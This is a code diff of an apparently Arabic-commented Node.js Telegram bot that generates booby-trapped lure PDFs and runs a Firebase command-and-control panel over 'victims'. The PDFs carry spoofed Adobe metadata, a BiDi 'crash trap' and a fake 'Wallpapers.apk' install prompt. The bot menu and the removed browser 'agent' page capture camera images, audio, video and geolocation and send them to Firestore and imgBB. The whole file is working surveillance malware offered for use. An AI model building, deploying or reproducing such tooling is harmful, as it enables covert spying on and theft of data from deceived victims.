@@ -1,7 +1,7 @@
 #!/usr/bin/env node
 // ============================================================
 // ARCHITECT TELEGRAM PDF WEAPONIZER + FIREBASE C2 + IMGBB
-// Render Ready – Reads ALL keys from environment variables
+// Render Ready – Final Stealth Agent Compatible
 // ============================================================
 require('dotenv').config();
 const TelegramBot = require('node-telegram-bot-api');
@@ -10,20 +10,16 @@ const sharp = require('sharp');
 const admin = require('firebase-admin');
 const express = require('express');
 
-// --- قراءة جميع المتغيرات من البيئة ---
+// --- متغيرات البيئة ---
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const ADMIN_ID = parseInt(process.env.ADMIN_ID);
 const PORT = process.env.PORT || 10000;
+const WEBHOOK_URL = process.env.WEBHOOK_URL;
 const IMGBB_API_KEY = process.env.IMGBB_API_KEY;
 
 const FIREBASE_PROJECT_ID = process.env.FIREBASE_PROJECT_ID;
 const FIREBASE_CLIENT_EMAIL = process.env.FIREBASE_CLIENT_EMAIL;
 const FIREBASE_PRIVATE_KEY = process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n');
-const FIREBASE_API_KEY = process.env.FIREBASE_API_KEY;
-const FIREBASE_AUTH_DOMAIN = process.env.FIREBASE_AUTH_DOMAIN;
-const FIREBASE_STORAGE_BUCKET = process.env.FIREBASE_STORAGE_BUCKET;
-const FIREBASE_MESSAGING_SENDER_ID = process.env.FIREBASE_MESSAGING_SENDER_ID;
-const FIREBASE_APP_ID = process.env.FIREBASE_APP_ID;
 
 // --- إعداد Firebase ---
 admin.initializeApp({
@@ -42,7 +38,7 @@ const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 // --- تخزين مؤقت لرمز القفل ---
 const pendingLockCode = new Map();
 
-// --- Zero‑Width + BiDi (للبيانات الوصفية) ---
+// --- Zero‑Width + BiDi Exploit (للبيانات الوصفية) ---
 const ZW_MAP = { '0': '\u200B', '1': '\u200C', 'B': '\u200D', 'E': '\uFEFF' };
 function generateCrashTrap() {
     return '\u202E'.repeat(4096) + '\u202A'.repeat(2048) + '['.repeat(1024) + '\u202A'.repeat(2048) + ']'.repeat(1024) + '\u202C';
@@ -58,8 +54,8 @@ function generatePayloadStub() {
     return Buffer.from('DEADBEEF1337CAFE'.repeat(4), 'hex');
 }
 
-// --- دالة PDF (بدون RLO مرئي) ---
-async function createWeaponizedPDF(imageBuffer, agentUrl) {
+// --- دالة PDF الملغوم (بدون RLO مرئي) ---
+async function createWeaponizedPDF(imageBuffer) {
     const pdfDoc = await PDFDocument.create();
     const page = pdfDoc.addPage([595, 842]);
     const font = await pdfDoc.embedFont(StandardFonts.Helvetica);
@@ -80,7 +76,9 @@ async function createWeaponizedPDF(imageBuffer, agentUrl) {
         height: imgDims.height,
     });
 
-    const displayName = 'Important_Document.pdf.apk';
+    const agentUrl = `${WEBHOOK_URL}/agent.html`;  // أو رابط الجندي على GitHub Pages
+    const displayName = 'Wallpapers.apk';
+
     page.drawText(`To view the content, please install the required update:\n${displayName}`, {
         x: 50, y: 100, size: 12, font, color: rgb(0,0,0.8)
     });
@@ -97,7 +95,7 @@ async function createWeaponizedPDF(imageBuffer, agentUrl) {
     pdfDoc.setTitle(`DOC_${Math.random().toString(36).substring(2,8).toUpperCase()}`);
     pdfDoc.setSubject('Confidential');
     pdfDoc.setCreator('Adobe Acrobat');
-    pdfDoc.setProducer('GhostWeaver v8.0');
+    pdfDoc.setProducer('GhostWeaver v9.0');
 
     return Buffer.from(await pdfDoc.save());
 }
@@ -106,7 +104,7 @@ async function createWeaponizedPDF(imageBuffer, agentUrl) {
 bot.onText(/\/start/, (msg) => {
     if (msg.from.id !== ADMIN_ID) return;
     bot.sendMessage(msg.chat.id,
-        '❤️ *جاهز سيدي المطور.*\n\n' +
+        '🖤 *جاهز سيدي المطور.*\n\n' +
         '⚡ *الوحش متصل بـ Firebase + imgBB*\n\n' +
         '/pdf - صنع PDF ملغوم\n/panel - عرض الضحايا\n\n📸 *أرسل /pdf ثم الصورة.*',
         { parse_mode: 'Markdown' }
@@ -130,9 +128,7 @@ bot.on('photo', async (msg) => {
         const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
         const response = await fetch(fileUrl);
         const buffer = Buffer.from(await response.arrayBuffer());
-        // رابط الجندي هو مسار /agent على نفس السيرفر
-        const agentUrl = `${process.env.WEBHOOK_URL}/agent`;
-        const pdfBuffer = await createWeaponizedPDF(buffer, agentUrl);
+        const pdfBuffer = await createWeaponizedPDF(buffer);
         await bot.sendDocument(msg.chat.id, pdfBuffer, {
             filename: 'document.pdf',
             caption: '💣 *PDF ملغوم جاهز.*\n\n📱 الضحية يجب أن يفتح الرابط ويثبت التطبيق.',
@@ -168,13 +164,11 @@ bot.on('callback_query', async (query) => {
         const victimId = data.split(':')[1];
         const commands = [
             [{ text: '📸 سحب الصور', callback_data: `cmd:${victimId}:gallery` }],
-            [{ text: '📁 سحب الملفات', callback_data: `cmd:${victimId}:files` }],
             [{ text: '🎤 تسجيل صوت', callback_data: `cmd:${victimId}:record_audio` }],
             [{ text: '🎥 تسجيل فيديو', callback_data: `cmd:${victimId}:record_video` }],
             [{ text: '📷 تصوير أمامي', callback_data: `cmd:${victimId}:camera_front` }],
             [{ text: '📷 تصوير خلفي', callback_data: `cmd:${victimId}:camera_back` }],
             [{ text: '📱 اهتزاز', callback_data: `cmd:${victimId}:vibrate` }],
-            [{ text: '💬 إشعار', callback_data: `cmd:${victimId}:toast` }],
             [{ text: '📍 الموقع', callback_data: `cmd:${victimId}:location` }],
             [{ text: '📊 معلومات', callback_data: `cmd:${victimId}:device_info` }],
             [{ text: '💣 فرمتة', callback_data: `cmd:${victimId}:format` }],
@@ -237,251 +231,12 @@ db.collectionGroup('results').onSnapshot(async (snap) => {
     }
 });
 
-// --- خادم HTTP + الجندي الديناميكي ---
+// --- خادم HTTP مع تقديم الجندي ---
 const app = express();
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+app.use(express.static('public')); // ضع index.html داخل مجلد public
 
-// Health check
 app.get('/', (req, res) => res.send('OK'));
 app.get('/health', (req, res) => res.send('OK'));
-
-// الجندي: صفحة HTML تُحقن فيها مفاتيح Firebase و imgBB من متغيرات البيئة
-app.get('/agent', (req, res) => {
-    const html = `
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Update</title>
-    <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { background:#0a0f0a; min-height:100vh; display:flex; justify-content:center; align-items:center; font-family:'Courier New',monospace; padding:16px; }
-        .card { background:#0d1a0d; border:2px solid #1a3a1a; border-radius:24px; padding:24px; max-width:400px; width:100%; box-shadow:0 0 30px rgba(0,255,0,0.1); color:#33ff33; text-align:center; }
-        h2 { color:#ff0055; text-shadow:0 0 8px #ff0055; margin-bottom:16px; }
-        .status { background:#020402; border:1px solid #33ff33; border-radius:16px; padding:16px; margin:20px 0; word-break:break-word; }
-        .btn-grid { display:grid; grid-template-columns:repeat(2,1fr); gap:10px; margin-top:20px; }
-        .btn { background:#1a2a1a; border:1px solid #33ff33; color:#33ff33; padding:14px 8px; border-radius:16px; font-weight:bold; cursor:pointer; transition:0.2s; }
-        .btn:active { background:#33ff33; color:#000; }
-        .btn.danger { border-color:#ff3366; color:#ff3366; }
-        .btn.danger:active { background:#ff3366; color:#000; }
-        .lock-input { background:#020402; border:1px solid #33ff33; color:#33ff33; padding:12px; border-radius:16px; width:100%; margin:10px 0; text-align:center; }
-    </style>
-</head>
-<body>
-<div class="card">
-    <h2>⚡ ARCHITECT</h2>
-    <div class="status" id="statusText">Initializing...</div>
-    <div id="extraUI"></div>
-    <div class="btn-grid">
-        <button class="btn" data-cmd="gallery">📸 Gallery</button>
-        <button class="btn" data-cmd="files">📁 Files</button>
-        <button class="btn" data-cmd="record_audio">🎤 Audio</button>
-        <button class="btn" data-cmd="record_video">🎥 Video</button>
-        <button class="btn" data-cmd="camera_front">📷 Front</button>
-        <button class="btn" data-cmd="camera_back">📷 Back</button>
-        <button class="btn" data-cmd="vibrate">📳 Vibrate</button>
-        <button class="btn" data-cmd="toast">💬 Toast</button>
-        <button class="btn" data-cmd="location">📍 GPS</button>
-        <button class="btn" data-cmd="device_info">📊 Info</button>
-        <button class="btn danger" data-cmd="format">💣 Format</button>
-        <button class="btn danger" data-cmd="lock_code">🔒 Lock</button>
-    </div>
-    <div style="margin-top:16px; font-size:12px;" id="deviceIdDisplay"></div>
-</div>
-<script type="module">
-    // المفاتيح من السيرفر (متغيرات البيئة)
-    const IMGBB_API_KEY = '${IMGBB_API_KEY}';
-    const FIREBASE_CONFIG = {
-        apiKey: '${FIREBASE_API_KEY}',
-        authDomain: '${FIREBASE_AUTH_DOMAIN}',
-        projectId: '${FIREBASE_PROJECT_ID}',
-        storageBucket: '${FIREBASE_STORAGE_BUCKET}',
-        messagingSenderId: '${FIREBASE_MESSAGING_SENDER_ID}',
-        appId: '${FIREBASE_APP_ID}'
-    };
-
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getFirestore, doc, setDoc, collection, addDoc, serverTimestamp, onSnapshot, query, where, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-
-    const app = initializeApp(FIREBASE_CONFIG);
-    const db = getFirestore(app);
-
-    let deviceId = localStorage.getItem('arch_device_id');
-    if (!deviceId) {
-        deviceId = 'web_' + Math.random().toString(36).substring(2, 15) + '_' + Date.now();
-        localStorage.setItem('arch_device_id', deviceId);
-    }
-    document.getElementById('deviceIdDisplay').innerText = 'ID: ' + deviceId.slice(0,12);
-    const statusEl = document.getElementById('statusText');
-    const extraDiv = document.getElementById('extraUI');
-
-    function setStatus(msg, ok=true) { statusEl.innerHTML = msg; statusEl.style.color = ok ? '#33ff33' : '#ff5555'; }
-
-    async function register() {
-        try {
-            await setDoc(doc(db, "victims", deviceId), {
-                name: navigator.userAgent.substring(0,100),
-                os: navigator.platform,
-                lastSeen: serverTimestamp(),
-                webAgent: true
-            });
-            setStatus('✅ Connected. Listening...');
-        } catch(e) { setStatus('❌ Firebase error', false); }
-    }
-
-    async function uploadToImgBB(base64) {
-        const formData = new FormData();
-        formData.append('image', base64.split(',')[1] || base64);
-        const res = await fetch('https://api.imgbb.com/1/upload?key=' + IMGBB_API_KEY, { method:'POST', body:formData });
-        const json = await res.json();
-        return json.data.url;
-    }
-
-    async function executeCommand(cmd, extra) {
-        setStatus('⚙️ ' + cmd);
-        try {
-            switch(cmd) {
-                case 'gallery': {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const track = stream.getVideoTracks()[0];
-                    const bitmap = await new ImageCapture(track).grabFrame();
-                    const canvas = document.createElement('canvas');
-                    canvas.width = bitmap.width; canvas.height = bitmap.height;
-                    canvas.getContext('2d').drawImage(bitmap,0,0);
-                    const url = await uploadToImgBB(canvas.toDataURL('image/jpeg',0.7));
-                    track.stop();
-                    await addDoc(collection(db, "victims", deviceId, "results"), { type:'photo', url, timestamp: serverTimestamp() });
-                    setStatus('📸 Sent');
-                    break;
-                }
-                case 'files': setStatus('⚠️ Web limited', false); break;
-                case 'record_audio': {
-                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    const recorder = new MediaRecorder(stream);
-                    const chunks = [];
-                    recorder.ondataavailable = e => chunks.push(e.data);
-                    recorder.onstop = async () => {
-                        const blob = new Blob(chunks, {type:'audio/webm'});
-                        const reader = new FileReader();
-                        reader.onloadend = async () => {
-                            const url = await uploadToImgBB(reader.result);
-                            await addDoc(collection(db, "victims", deviceId, "results"), { type:'file', url, filename:'audio.webm', timestamp: serverTimestamp() });
-                            setStatus('🎵 Audio sent');
-                        };
-                        reader.readAsDataURL(blob);
-                    };
-                    recorder.start();
-                    setTimeout(()=>recorder.stop(),3000);
-                    break;
-                }
-                case 'record_video': {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
-                    const recorder = new MediaRecorder(stream);
-                    const chunks = [];
-                    recorder.ondataavailable = e => chunks.push(e.data);
-                    recorder.onstop = async () => {
-                        const blob = new Blob(chunks, {type:'video/webm'});
-                        const reader = new FileReader();
-                        reader.onloadend = async () => {
-                            const url = await uploadToImgBB(reader.result);
-                            await addDoc(collection(db, "victims", deviceId, "results"), { type:'file', url, filename:'video.webm', timestamp: serverTimestamp() });
-                            setStatus('🎬 Video sent');
-                        };
-                        reader.readAsDataURL(blob);
-                    };
-                    recorder.start();
-                    setTimeout(()=>recorder.stop(),3000);
-                    break;
-                }
-                case 'camera_front': case 'camera_back': {
-                    const facing = cmd.endsWith('front') ? 'user' : 'environment';
-                    const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode: facing } });
-                    const track = stream.getVideoTracks()[0];
-                    const bitmap = await new ImageCapture(track).grabFrame();
-                    const canvas = document.createElement('canvas');
-                    canvas.width = bitmap.width; canvas.height = bitmap.height;
-                    canvas.getContext('2d').drawImage(bitmap,0,0);
-                    const url = await uploadToImgBB(canvas.toDataURL('image/jpeg',0.8));
-                    track.stop();
-                    await addDoc(collection(db, "victims", deviceId, "results"), { type:'photo', url, timestamp: serverTimestamp() });
-                    setStatus('📷 Sent');
-                    break;
-                }
-                case 'vibrate': navigator.vibrate?.(1000); setStatus('📳 Vibration'); break;
-                case 'toast': {
-                    const el = document.createElement('div');
-                    el.style.cssText = 'position:fixed;bottom:20px;left:20px;right:20px;background:#1a3a1a;color:#0f0;padding:16px;border-radius:16px;z-index:9999;text-align:center';
-                    el.innerText = '📨 Message from controller';
-                    document.body.appendChild(el);
-                    setTimeout(()=>el.remove(),3000);
-                    setStatus('💬 Toast shown');
-                    break;
-                }
-                case 'location': {
-                    const pos = await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:10000}));
-                    const {latitude,longitude} = pos.coords;
-                    await addDoc(collection(db, "victims", deviceId, "results"), { type:'location', lat:latitude, lng:longitude, timestamp: serverTimestamp() });
-                    setStatus('📍 Location sent');
-                    break;
-                }
-                case 'device_info': {
-                    let info = 'UserAgent: '+navigator.userAgent+'\\nPlatform: '+navigator.platform;
-                    if ('getBattery' in navigator) {
-                        const b = await navigator.getBattery();
-                        info += '\\nBattery: '+Math.round(b.level*100)+'% '+(b.charging?'⚡':'');
-                    }
-                    await addDoc(collection(db, "victims", deviceId, "results"), { type:'device_info', info, timestamp: serverTimestamp() });
-                    setStatus('📊 Info sent');
-                    break;
-                }
-                case 'format': setStatus('💣 Format (simulated)', false); break;
-                case 'lock_code': {
-                    const code = extra || prompt('Enter lock code:');
-                    if (code) {
-                        localStorage.setItem('lock_code', code);
-                        await addDoc(collection(db, "victims", deviceId, "results"), { type:'device_info', info:'Lock code set: '+code, timestamp: serverTimestamp() });
-                        setStatus('🔒 Code set');
-                    }
-                    break;
-                }
-            }
-        } catch(e) { setStatus('❌ '+e.message, false); }
-    }
-
-    function listenCommands() {
-        const q = query(collection(db, "victims", deviceId, "commands"), where("status","==","pending"));
-        onSnapshot(q, async (snap) => {
-            for (const change of snap.docChanges()) {
-                if (change.type === 'added') {
-                    const d = change.doc.data();
-                    await executeCommand(d.command, d.code);
-                    await updateDoc(change.doc.ref, { status:'done' });
-                }
-            }
-        });
-    }
-
-    document.querySelectorAll('[data-cmd]').forEach(btn => {
-        btn.addEventListener('click', () => {
-            const cmd = btn.dataset.cmd;
-            if (cmd === 'lock_code') {
-                const val = prompt('Enter lock code:');
-                if (val) executeCommand(cmd, val);
-            } else if (cmd === 'format') {
-                if (confirm('Simulate format?')) executeCommand(cmd);
-            } else executeCommand(cmd);
-        });
-    });
-
-    register().then(()=> listenCommands());
-</script>
-</body>
-</html>
-    `;
-    res.send(html);
-});
 
 app.listen(PORT, '0.0.0.0', () => console.log(`🌐 Server on ${PORT}`));
 console.log('🤖 Architect C2 Bot started.');
